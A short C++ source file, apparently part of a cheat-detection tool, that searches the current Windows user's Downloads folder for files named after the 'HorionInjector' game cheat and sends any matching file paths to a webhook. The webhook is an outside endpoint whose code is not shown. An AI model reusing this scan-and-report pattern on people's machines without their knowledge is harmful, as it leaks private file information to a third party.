#include "Stage1.h"
#include "../Utils/Utils.h"

void Stage1::stage1()
{
    Utils utils;
    std::string keyword = "HorionInjector";
    std::string path = "C:\\Users\\" + utils.getFileUsername() + "\\Downloads";

    std::vector<std::string> resultFiles = utils.searchFiles(keyword, path);

    if (!resultFiles.empty())
    {
        utils.sendWebhook("Horion", resultFiles);
    }
}